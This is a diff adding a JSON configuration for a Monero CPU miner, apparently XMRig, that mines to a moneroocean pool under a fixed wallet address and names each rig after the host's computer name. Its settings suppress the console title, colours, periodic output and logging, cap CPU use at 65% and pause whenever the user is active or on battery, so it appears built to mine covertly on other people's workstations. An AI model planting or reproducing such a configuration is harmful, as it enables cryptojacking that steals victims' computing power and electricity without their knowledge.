@@ -1,0 +1,43 @@
+{
+    "api": {"enabled": false},
+    "http": {"enabled": false},
+    "autosave": true,
+    "background": false,
+    "colors": false,
+    "title": false,
+    "randomx": {"init": 0, "mode": "auto"},
+    "cpu": {
+        "enabled": true,
+        "huge-pages": false,
+        "priority": 0,
+        "max-threads-hint": 65,
+        "yield": true
+    },
+    "pools": [
+        {
+            "algo": null,
+            "coin": "monero",
+            "url": "gulf.moneroocean.stream:20128",
+            "user": "46E5Ah4imT3aA137KDwtg4dAmfcdib3n7NqRuBFSCZnp3wkLAoRCN3zf73VHnrn9Yg68navoihuLSYD6WL6HEZukAEAtswH",
+            "pass": "x",
+            "rig-id": "workstation-%COMPUTERNAME%",
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": true,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "print-time": 0,
+    "health-print-time": 0,
+    "syslog": false,
+    "verbose": 0,
+    "watch": false,
+    "pause-on-battery": true,
+    "pause-on-active": true,
+    "donate-level": 0
+}
